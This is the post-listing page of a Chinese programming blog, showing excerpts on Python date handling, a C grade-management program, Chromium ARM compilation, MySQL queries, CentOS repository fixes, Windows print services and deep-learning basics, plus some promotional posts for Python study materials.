<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99e6fa33649580799561a51b59f0ce5f/" rel="bookmark">
			Python time时间格式化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、时间戳转换为指定格式日期 import time t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) print(t) timestamp = time.time() tuple_time = time.localtime(timestamp) print(tuple_time) print(time.strftime("%Y-%m-%d %H:%M:%S", tuple_time)) 2、将字符串的时间转换为时间戳 import time import datetime time_str = "2023-02-19 23:07:21" time_struct = time.strptime(time_str, "%Y-%m-%d %H:%M:%S") print(time_struct) print(time.mktime(time_struct)) print(int(time.mktime(time_struct))) 3、Datetime详细介绍 Python提供了多个内置模块用于操作日期时间，像calendar，time，datetime。time模块我在之前的文章已经有所介绍，它提供 的接口与C标准库time.h基本一致。相比于time模块，datetime模块的接口则更直观、更容易调用。今天就来讲讲datetime模块。
datetime模块定义了两个常量：datetime.MINYEAR和datetime.MAXYEAR，分别表示datetime所能表示的最 小、最大年份。其中，MINYEAR = 1，MAXYEAR = 9999。（对于偶等玩家，这个范围已经足够用矣~~）
datetime模块定义了下面这几个类：
datetime.date：表示日期的类。常用的属性有year, month, day；
datetime.time：表示时间的类。常用的属性有hour, minute, second, microsecond；
datetime.datetime：表示日期时间。
datetime.timedelta：表示时间间隔，即两个时间点之间的长度。
datetime.tzinfo：与时区有关的相关信息。（这里不详细充分讨论该类，感兴趣的童鞋可以参考python手册）
注 ：上面这些类型的对象都是不可变（immutable）的。
下面详细介绍这些类的使用方式。
date类 date类表示一个日期。日期由年、月、日组成（地球人都知道~~）。date类的构造函数如下：
class datetime.date(year, month, day)：参数的意义就不多作解释了，只是有几点要注意一下：
year的范围是[MINYEAR, MAXYEAR]，即[1, 9999]；
month的范围是[1, 12]。（月份是从1开始的，不是从0开始的~_~）；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99e6fa33649580799561a51b59f0ce5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/391b8c372026300405f27a648e15a02a/" rel="bookmark">
			C语言—高校学生成绩管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 基于C语言的高校学生成绩管理系统，实现录入学生信息、打印学生信息、保存学生信息、读取学生信息、统计学生人数、查找学生信息、修改删除学生信息的基本功能。代码实现部分将给出实现各个功能的代码步骤解析，完整代码会在文章末尾给出。
代码实现： 基于以上功能，给出用户界面：
//用户界面 void Welcome() { printf("************************\n"); printf("*欢迎使用学生成绩管理系统*\n"); printf("************************\n"); printf("* 请选择功能 *\n"); printf("************************\n"); printf("* 1.录入信息 *\n"); printf("* 2.打印信息 *\n"); printf("* 3.保存信息 *\n"); printf("* 4.读取信息 *\n"); printf("* 5.统计人数 *\n"); printf("* 6.查找信息 *\n"); printf("* 7.修改信息 *\n"); printf("* 8.删除信息 *\n"); printf("* 0.退出系统 *\n"); printf("************************\n"); } 1.录入信息 关于录入信息的实现，首先需要创建一个包含学生信息链表，包括但不限于学生的学号，姓名，年龄和成绩。我们把定义好的结构体重命名为'Stu',表示学生信息，代码如下：
//定义学生 typedef struct _Stu { char name[20];//姓名 int age; //年龄 char num[20]; //学号 float score; //成绩 }Stu; 要建立链表，首先我们需要定义一个头节点，使初始头节点为空，代码是实现如下：
//定义节点 typedef struct _Node { Stu s1; //学生 struct _Node*pNext; //指向下一个节点 }Node; //定义头节点 Node *g_pHead = NULL; 定义录入信息函数'Input()'，创建新节点，将创建的新节点利用头插法插入我们所建立的链表之中，并输入我们需要输入的信息，代码如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/391b8c372026300405f27a648e15a02a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7282a97230626db363455f254eb6f274/" rel="bookmark">
			docker run 命令转化为 docker-compose 工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工作当中需要将 docker run 转换为更方便的 docker-compose 格式，可以使用下面的工具来完成。
转换工具：https://www.composerize.com/?utm_source=appinn.com
使用介绍：https://www.appinn.com/composerize-for-docker-compose/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2d216767a3fd6745b661814d220e2f7/" rel="bookmark">
			chromium ARM版本编译记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 用的国产电脑，统信麒麟自带的chromium版本都是83版本,lceda要求超过100版本，低版本没法打开编辑器，只能用客户端版本。都是JS，还整这么多事...
刚开始想着一步到位直接在阿里云香港主机上买高配置的竞价虚拟机，结果居然编译不过，老是报有个东西没安装，试了好几次都不行，本来都计划放弃了的。周末闲着没事，想着家里的12核32GB的x86电脑也不弱了，再来搞一次交叉编译试试。
代码获取 必要条件是必须有办法有梯子,没梯子，代码都拉不下来。
编译过程参考的步骤，官网有2个网页。但是都太简单了，还有个stackexchange的问答，里面详细一些。
https://chromium.googlesource.com/chromium/src/+/main/docs/linux/build_instructions.md
https://chromium.googlesource.com/chromium/src/+/main/docs/linux/chromium_arm.md
ubuntu - Compile Chromium Browser for ARM (2019) - Unix &amp; Linux Stack Exchange
基本上参考这3个地址就能正常编译了。
这里主要记录下我编译过程：
先配置git和http代理
/usr/bin/git config --global http.proxy http://xxx:xx /usr/bin/git config --global https.proxy http://xxx:xx export http_proxy="http://xxx:xx" export https_proxy="http://xxx:xx" 然后拉工具配置环境
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git export PATH="$PATH:$HOME/chromium/depot_tools" 然后拉代码
mkdir ~/chromium &amp;&amp; cd ~/chromium fetch --nohooks --no-history chromium --no-history能节约好多空间。
配置和编译 然后就开始安装依赖
./build/install-build-deps.sh 这个过程报了个错,看了下是拉谷歌字体的时候用的个Py调用的curl，Py里面没法把环境变量的代理传进去，手工编辑下
vi ./build/linux/install-chromeos-fonts.py #找到curl的那行，添加 '-x', 'http://192.168.5.221:20171', 改好后的调用如下 subprocess.check_call(['curl', '-x', 'http://192.168.5.221:20171', '-L', url, '-o', tarball]) 再执行install-build-deps.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2d216767a3fd6745b661814d220e2f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9a992b83fc771cd6471719d2aae20df/" rel="bookmark">
			数据库内日期类型数据大于小于条件查找注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		只传date格式的日期取查datetime的字段的话默认是 00:00:00
日期类型字符串需要使用 ’ ’ 单引号括住
使用大于小于条件查询某一天的日期数据 前后判断条件不能是同一天
一个例子
数据库内数据：
查询2023-08-14之后的数据：
select * from tetstable where updatetime &gt;= '2023-08-14'; 查询2023-08-14之前的数据：
SELECT * FROM `tetstable`WHERE updatetime &lt;= '2023-08-14' 查询2023-08-14一天内的数据：
SELECT * FROM `tetstable` WHERE updatetime &gt;= '2023-08-14' and updatetime &lt;= '2023-08-15'; 注意：大于小于的判断日期不能是同一天，否则会导致查询数据为空！
SELECT * FROM `tetstable` WHERE updatetime &gt;= '2023-08-14' and updatetime &lt;= '2023-08-14'; 因为date类型数据传入timestamp字段会自动转换为0点0分0秒
也就是说上面SQL语句等价于：
SELECT * FROM tetstable WHERE updatetime &gt;= '2023-08-14 00:00:00' and updatetime &lt;= '2023-08-14 00:00:00';
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d9fb34d4ef081673badede083fb1f26/" rel="bookmark">
			el-form表单clearValidate清除某个字段的校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 el-form表单clearValidate清除某个字段的校验 this.$refs.form.clearValidate(field); // field---要清除校验的表单字段 注意： 在 Element UI 表单中，如果没有设置校验规则，调用 clearValidate 方法会报错
为了避免报错，可以在调用 clearValidate 之前，先判断表单项是否设置了校验规则 if (this.$refs.form.validate) { this.$refs.form.clearValidate(); } 在 Element UI 表单中，某个字段没有设置校验规则，调用 clearValidate 方法清除该字段的校验会报错
为了避免报错，可以在调用 clearValidate 之前，先检查字段是否存在校验规则。可以使用以下方法来判断校验规则是否存在 const field = 'fieldName'; // 替换为要清除校验的字段名 const rules = this.$refs.form.rules; if (rules &amp;&amp; rules[field]) { this.$refs.form.clearValidate(field); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5e7db121ef469b566554a0429bd689f/" rel="bookmark">
			Python--操作系统进行交互 【OS库】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Python 中，os 是一个内置的标准库，用于与操作系统进行交互。它提供了许多函数和方法，用于执行与操作系统相关的任务，例如文件类操作和目录操作、进程管理、环境变量访问等。
接下来我给大家列举一下比较常用的文件操作方法：
代码示例⬇⬇⬇⬇⬇⬇⬇： 1、os.getcwd(): 返回当前工作目录的路径。 import os # 返回当前工作目录 current_dir = os.getcwd() print("当前工作目录：", current_dir) 2、os.chdir(path): 将当前工作目录更改为指定的路径。 import os os.chdir("/path/to/directory") # 将当前工作目录更改为指定目录 3、os.listdir(path): 返回指定目录中的文件和文件夹列表。 import os files = os.listdir("/path/to/directory") # 获取目录中的文件和文件夹列表 for file in files: print(file) 4、os.mkdir(path): 创建一个新的目录。 import os os.mkdir("/path/to/new_directory") # 创建一个新的目录 5、os.remove(path): 删除指定的文件。 import os os.remove("/path/to/file.txt") # 删除指定的文件 6、os.rename(src, dst): 重命名文件或目录。 import os os.rename("/path/to/old_name.txt", "/path/to/new_name.txt") # 重命名文件或目录 7、os.walk() 用于遍历一个目录及其子目录中的所有文件和文件夹 import os # 它返回一个生成器对象，可以用于递归地遍历目录树 for root, dirs, files in os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5e7db121ef469b566554a0429bd689f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/548661d0e0c64e7299a83c1b35dbd2d5/" rel="bookmark">
			SQL 临时表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建临时表，一定要 drop table 临时表
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98bf65862741a79ec1dc75ec47e64c4a/" rel="bookmark">
			Windows server 部署打印
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.常见的企业打印方案
1&gt;网络打印机
2&gt;打印服务器
3&gt;Windows打印服务
2.网络打印、打印服务器及Windows打印服务的结构
网络打印：直接连接至交换机或无线AP
使用TCP/IP协议
Windows server 部署打印服务_打印服务器
打印服务器：带有线或无线的网络接口用于连接网络
适合于中小企业
充分利用现有资源
Windows server 部署打印服务_Windows_02
Windows打印服务
在网络上共享打印机
使用打印管理控制台集中管理打印任务
Windows server 部署打印服务_打印服务器_03
2.怎么设置共享打印机和怎么链接打印机
设置打印机共享：
添加打印机
Windows server 部署打印服务_打印服务器_04
设置打印机共享
Windows server 部署打印服务_优先级_05
Windows server 部署打印服务_打印服务器_06
默认打印机
右击打印机属性把该打印机设置为默认打印机
访问共享打印机的方法：UNC路径:11打印服务器IP地址或主机名
3.配置打印池的作用
1&gt;由一组打印机组成的逻辑打印机
2&gt;缩短用户等待大批量打印作业完成的时间
3&gt;选用同一型号打印机
4.优先级的最高级与最低级分别是什么
最高级：99
最低级：1
5.为什么要设置优先级？优先级相同时会先打印那个？
方便某些部门快速打印
优先级相等时，按照时间的先后顺序打印。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/302347cecedf19eafbd95c8b579b863f/" rel="bookmark">
			一文看懂深度学习（白话解释（比喻为水流）&#43;8个优缺点&#43;4个典型算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可与该文参照​​​​​​​一起看。
本文首发自 easyAI - 人工智能知识库
原文地址：《一文看懂深度学习（白话解释+8个优缺点+4个典型算法）》
深度学习有很好的表现，引领了第三次人工智能的浪潮。目前大部分表现优异的应用都用到了深度学习，大红大紫的 AlphaGo 就使用到了深度学习。
本文将详细的给大家介绍深度学习的基本概念、优缺点和主流的4个典型算法。
深度学习、神经网络、机器学习、人工智能的关系
深度学习、机器学习、人工智能
简单来说：
深度学习是机器学习的一个分支(最重要的分支)
机器学习是人工智能的一个分支
目前表现最好的一些应用大部分都是深度学习，正是因为深度学习的突出表现，引发了人工智能的第三次浪潮。详情可以看《人工智能的发展史——3次 AI 浪潮》
深度学习、神经网络
深度学习的概念源于人工神经网络的研究，但是并不完全等于传统神经网络。
不过在叫法上，很多深度学习算法中都会包含"神经网络"这个词，比如：卷积神经网络、循环神经网络。
所以，深度学习可以说是在传统神经网络基础上的升级，约等于神经网络。
大白话解释深度学习
看了很多版本的解释，发现李开复在《人工智能》一书中讲的是最容易理解的，所以下面直接引用他的解释：
我们以识别图片中的汉字为例。
假设深度学习要处理的信息是“水流”，而处理数据的深度学习网络是一个由管道和阀门组成的巨大水管网络。网络的入口是若干管道开口，网络的出口也是若干管道开口。这个水管网络有许多层，每一层由许多个可以控制水流流向与流量的调节阀。根据不同任务的需要，水管网络的层数、每层的调节阀数量可以有不同的变化组合。对复杂任务来说，调节阀的总数可以成千上万甚至更多。水管网络中，每一层的每个调节阀都通过水管与下一层的所有调节阀连接起来，组成一个从前到后，逐层完全连通的水流系统。
那么，计算机该如何使用这个庞大的水管网络来学习识字呢？
比如，当计算机看到一张写有“田”字的图片，就简单将组成这张图片的所有数字（在计算机里，图片的每个颜色点都是用“0”和“1”组成的数字来表示的）全都变成信息的水流，从入口灌进水管网络。
我们预先在水管网络的每个出口都插一块字牌，对应于每一个我们想让计算机认识的汉字。这时，因为输入的是“田”这个汉字，等水流流过整个水管网络，计算机就会跑到管道出口位置去看一看，是不是标记由“田”字的管道出口流出来的水流最多。如果是这样，就说明这个管道网络符合要求。如果不是这样，就调节水管网络里的每一个流量调节阀，让“田”字出口“流出”的水最多。
这下，计算机要忙一阵了，要调节那么多阀门！好在计算机的速度快，暴力的计算加上算法的优化，总是可以很快给出一个解决方案，调好所有阀门，让出口处的流量符合要求。
下一步，学习“申”字时，我们就用类似的方法，把每一张写有“申”字的图片变成一大堆数字组成的水流，灌进水管网络，看一看，是不是写有“申”字的那个管道出口流水最多，如果不是，我们还得再调整所有的阀门。这一次，要既保证刚才学过的“田”字不受影响，也要保证新的“申”字可以被正确处理。
如此反复进行，知道所有汉字对应的水流都可以按照期望的方式流过整个水管网络。这时，我们就说，这个水管网络是一个训练好的深度学习模型了。当大量汉字被这个管道网络处理，所有阀门都调节到位后，整套水管网络就可以用来识别汉字了。这时，我们可以把调节好的所有阀门都“焊死”，静候新的水流到来。
与训练时做的事情类似，未知的图片会被计算机转变成数据的水流，灌入训练好的水管网络。这时，计算机只要观察一下，哪个出水口流出来的水流最多，这张图片写的就是哪个字。
深度学习大致就是这么一个用人类的数学知识与计算机算法构建起来的整体架构，再结合尽可能多的训练数据以及计算机的大规模运算能力去调节内部参数，尽可能逼近问题目标的半理论、半经验的建模方式。
传统机器学习 VS 深度学习
传统机器学习和深度学习的相似点
在数据准备和预处理方面，两者是很相似的。
他们都可能对数据进行一些操作：
数据清洗
数据标签
归一化
去噪
降维
对于数据预处理感兴趣的可以看看《AI 数据集最常见的6大问题（附解决方案）》
传统机器学习和深度学习的核心区别
传统机器学习的特征提取主要依赖人工，针对特定简单任务的时候人工提取特征会简单有效，但是并不能通用。
深度学习的特征提取并不依靠人工，而是机器自动提取的。这也是为什么大家都说深度学习的可解释性很差，因为有时候深度学习虽然能有好的表现，但是我们并不知道他的原理是什么。
深度学习的优缺点
优点1：学习能力强
从结果来看，深度学习的表现非常好，他的学习能力非常强。
优点2：覆盖范围广，适应性好
深度学习的神经网络层数很多，宽度很广，理论上可以映射到任意函数，所以能解决很复杂的问题。
优点3：数据驱动，上限高
深度学习高度依赖数据，数据量越大，他的表现就越好。在图像识别、面部识别、NLP 等部分任务甚至已经超过了人类的表现。同时还可以通过调参进一步提高他的上限。
优点4：可移植性好
由于深度学习的优异表现，有很多框架可以使用，例如 TensorFlow、Pytorch。这些框架可以兼容很多平台。
缺点1：计算量大，便携性差
深度学习需要大量的数据很大量的算力，所以成本很高。并且现在很多应用还不适合在移动设备上使用。目前已经有很多公司和团队在研发针对便携设备的芯片。这个问题未来会得到解决。
缺点2：硬件需求高
深度学习对算力要求很高，普通的 CPU 已经无法满足深度学习的要求。主流的算力都是使用 GPU 和 TPU，所以对于硬件的要求很高，成本也很高。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/302347cecedf19eafbd95c8b579b863f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11a00b54636c7e4ac0b10fb854897870/" rel="bookmark">
			AppStream下载元数据失败
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误：为仓库 'AppStream' 下载元数据失败 : Cannot prepare internal mirrorlist: No URLs in mirrorlist
目录
一、域名解析
二、CentOS-AppStream.repo
三、CentOS-Base.repo
四、CentOS-Extras.repo
五、rpm更新
一、域名解析 先验证 ping www.baidu.com 不ok则添加域名解析，ok的页建议
[root@localhost ~]# vim /etc/resolv.conf
nameserver 8.8.8.8
nameserver 114.114.114.114
重启网络服务，如有启动不成功(centos版本问题，不支持，)
添加镜像源，并更新rpm
不支持：
[root@localhost ~]# service network restart Redirecting to /bin/systemctl restart network.service
则尝试：service networking restart 或者
[root@localhost yum.repos.d]# nmcli c reload
二、CentOS-AppStream.repo #[AppStream]
#name=CentOS-$releasever - AppStream
#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=AppStream&amp;infra=$infra
#baseurl=http://mirror.centos.org/$contentdir/$releasever/AppStream/$basearch/os/
#gpgcheck=1
#enabled=1
#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial
[AppStream]
name=CentOS-$releasever - AppStream
baseurl=https://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/
gpgcheck=1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11a00b54636c7e4ac0b10fb854897870/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a43e7d2877e8afef4c449b0944595af7/" rel="bookmark">
			autofit 实现自适应可视化大屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		autofit 实现自适应可视化大屏 安装 npm i autofit.js 使用 import autofit from 'autofit.js' autofit.init({ ignore: ['#map'], //忽略缩放的元素 dh: 1080, dw: 1920, el: '#app', resize: true }) 具体使用请参考https://github.com/LarryZhu-dev/autofit.js
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/061e004a93d6fe13501f8ecdd50d0459/" rel="bookmark">
			新手必看！Python计算水仙花数的4种方法！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		水仙花数是指一个 3 位数，它的每个位上的数字的 3次幂之和等于它本身(例如：1^3 + 5^3+ 3^3 = 153)
方法1：
用 for循环 控制1000以内的3位数，依次求出该3位数中的个十百位，判断是否是水仙花数
方法2：
x,y,z分别表示一个三位数的百位十位个位，所以这个三位数等于x乘以100加上y乘以10加上z。这个数也等于x的三次幂加上y 的三次幂再加上z的三次幂。两者相等，即所求之数。
方法3：
通过while循环列出1000以内所有三位数，然后通过取整数算出百位，减去百位，然后除以10化整减去个位算出十位，取余数算出个位，然后进行**3来验证是否水仙花数
方法4：
将数字先转化为字符串，利用字符串索引找到百、十、个位的数字值，再按照水仙花数的定义来找符合条件的数
以上就是python打印所有三位数水仙花数的实例，希望能给学习路上的你一些帮助!
如果你对Python感兴趣的话，可以试试我整理的这份Python全套学习资料，0基础入门+进阶实战，你想要的这里都有。微信扫码免费领取
包括：Python永久使用安装包、Python web开发，Python爬虫，Python数据分析，人工智能、机器学习等学习教程。带你从零基础系统性的学好Python！
零基础Python学习资源介绍 一、Python所有方向的学习路线 Python所有方向路线就是把Python常用的技术点做整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python学习软件 工欲善其事，必先利其器。学习Python常用的开发软件都在这里了！
三、Python入门学习视频 还有很多适合0基础入门的学习视频，有了这些视频，轻轻松松上手Python~
四、Python练习题 每节视频课后，都有对应的练习题哦，可以检验学习成果哈哈！
五、Python实战案例 光学理论是没用的，要学会跟着一起敲代码，动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。这份资料也包含在内的哈~
六、Python面试资料 我们学会了Python之后，有了技能就可以出去找工作啦！下面这些面试题是都来自阿里、腾讯、字节等一线互联网大厂，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
七、资料领取 上述完整版Python全套学习资料已经上传CSDN官方，需要的小伙伴可自行微信扫描下方CSDN官方认证二维码免费领取
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/003450aedf94df5f8b164a942c76ca74/" rel="bookmark">
			5 种方法，来为 Android Studio Flamingo（火烈鸟）版本，准备 你的app构建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当您升级到 Android Studio Flamingo 和 Android Gradle 插件 (AGP) 8.0 时，您需要更新您的 app 构建文件，以适配五个重要的 构建行为变更。
AGP 升级助手 可以帮助您完成这些变更。当您使用它时，它会建议通过添加代码行，来选择退出 构建行为变更，以保留现有的构建行为。稍后也可以通过删除这些代码行，迁移到新行为。
请注意，在本文中我们指的是 build.gradle.kts 文件，但如果您使用的是 Groovy，则相同的变更，适用于 build.gradle 文件。让我们来看看这些变化。
使用 DSL，来声明命名空间属性 namespace DSL 属性，代表生成的 R 和 BuildConfig 类的 Kotlin 或 Java 包名称，并替换之前在 Android 清单中定义的 package 属性。要迁移到命名空间配置，请将 namespace DSL 添加到模块级 build.gradle.kts 文件中的 android {} 块，并删除清单文件中的 package 属性。
// Android manifest &lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" - package="com.example.app" &gt; // 模块 build.gradle.kts android { + namespace = "com.example.app" compileSdk = 33 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/003450aedf94df5f8b164a942c76ca74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fd49d54dc27290952d306d27e1bc5f7/" rel="bookmark">
			Python最全学习资料合集，超强福利等你来拿！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 一直以来都有很多想学习Python的朋友们问我，学Python怎么学？爬虫和数据分析怎么学？web开发的学习路线能教教我吗？
我先告诉大家一个点，不管你是报了什么培训班，还是自己在通过各种渠道自学，你一定要注重一个东西：完整的知识体系。
感觉很迷茫？学了一段时间还是不入流？很大一部分原因是因为你没有一个完整的知识体系，你不知道自己现在的进度、未来的方向。
这里整理了很久有最全的Python所有方向的学习路线，今天把福利分享给大家！
一、Python所有方向的学习路线
Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照下面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python必备开发工具
工具都帮大家整理好了，安装就可直接上手！
三、最新Python学习笔记
当我学到一定基础，有自己的理解能力的时候，会去阅读一些前辈整理的书籍或者手写的笔记资料，这些笔记详细记载了他们对一些技术点的理解，这些理解是比较独到，可以学到不一样的思路。
四、Python视频合集
观看全面零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
五、实战案例
纸上得来终觉浅，要学会跟着视频一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
六、面试宝典
简历模板 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f56e4a594e42897a0c59899bd7c2891/" rel="bookmark">
			sykwalking8.2和mysql5.7快速部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.SkyWalking 是什么？ 分布式系统的应用程序性能监视工具，专为微服务、云原生架构和基于容器（Docker、K8s、Mesos）架构而设计。
提供分布式追踪、服务网格遥测分析、度量聚合和可视化一体化解决方案。
2.SkyWalking 有哪些功能？ 多种监控手段。可以通过语言探针和 service mesh 获得监控是数据。多个语言自动探针。包括 Java，.NET Core 和 Node.JS。轻量高效。无需大数据平台，和大量的服务器资源。模块化。UI、存储、集群管理都有多种机制可选。支持告警。优秀的可视化解决方案。 3.整体架构 整个架构，分成上、下、左、右四部分：
考虑到让描述更简单，我们舍弃掉 Metric 指标相关，而着重在 Tracing 链路相关功能。
上部分 Agent ：负责从应用中，收集链路信息，发送给 SkyWalking OAP 服务器。目前支持 SkyWalking、Zikpin、Jaeger 等提供的 Tracing 数据信息。而我们目前采用的是，SkyWalking Agent 收集 SkyWalking Tracing 数据，传递给服务器。下部分 SkyWalking OAP ：负责接收 Agent 发送的 Tracing 数据信息，然后进行分析(Analysis Core) ，存储到外部存储器( Storage )，最终提供查询( Query )功能。右部分 Storage ：Tracing 数据存储。目前支持 ES、MySQL、Sharding Sphere、TiDB、H2 多种存储器。而我们目前采用的是 ES ，主要考虑是 SkyWalking 开发团队自己的生产环境采用 ES 为主。左部分 SkyWalking UI ：负责提供控台，查看链路等等。 4.搭建 SkyWalking 单机环境
4.1使用各种数据库作为skywalking数据存储的地方，可以是es，mysql，h2等
4.2在官网下载skywalking Index of /dist/skywalkinghttps://archive.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f56e4a594e42897a0c59899bd7c2891/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8569ece5f75388971d8ce9a769039f0e/" rel="bookmark">
			mysql去除表中重复数据(保留最小或者保留最大id数据)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 -- 删除重复留最小 DELETE t1 FROM ct_course_info t1 INNER JOIN ct_course_info t2 WHERE t1.id &gt; t2.id AND t1.`name` = t2.`name` -- 删除重复留最大 DELETE t1 FROM ct_course_info t1 INNER JOIN ct_course_info t2 WHERE t1.id &lt; t2.id AND t1.`name` = t2.`name` 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7fb51fd8339f9d54c18cdb4074642e1/" rel="bookmark">
			外卖点餐小程序—商家使用手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		外卖点餐—商家使用手册 快速上手员工管理添加模块功能概况添加员工 web端 后台功能说明首页商户概况商家信息 外卖订单处理订单查询外卖设置配送设置 商品外卖商品添加商品商品扩展快速导入 数据外卖概况 应用优惠卷满额立减配送费满减弹窗优惠券下单返红包支付有礼店铺满赠超级换购商品活动第二件打折兑换码 快速上手 员工管理添加 模块功能概况 添加员工 web端 后台功能说明 首页 商户概况 实时查看主门店运营资讯、实时概况、订单概况、流量看板以及商品排行一键开关店铺自动接单一键开启、关闭 商家信息 上传预览小程序前请务必先配置好主门店商户信息，否则页面无法打开
外卖 订单处理 功能说明：主要处理外卖新订单，方便商户查看，主要状态有新订单、待配送、预订单提醒、催单、退款/售后状态
新订单：用户在小程序下单，商户未接单的状态
待配送：商户已接订单，但订单未配送状态
预订单提醒：用户预订单即将到时间的订单提醒
催单：用户长时间未收到商品进行催单的状态（注意：此功能可以关闭催单）
退款/售后：用户申请退单或者申请退款的订单状态
新订单：用户在小程序下单，商户未接单的状态
待配送：商户已接订单，但订单未配送状态
预订单提醒：用户预订单即将到时间的订单提醒
催单：用户长时间未收到商品进行催单的状态（注意：此功能可以关闭催单）
退款/售后：用户申请退单或者申请退款的订单状态
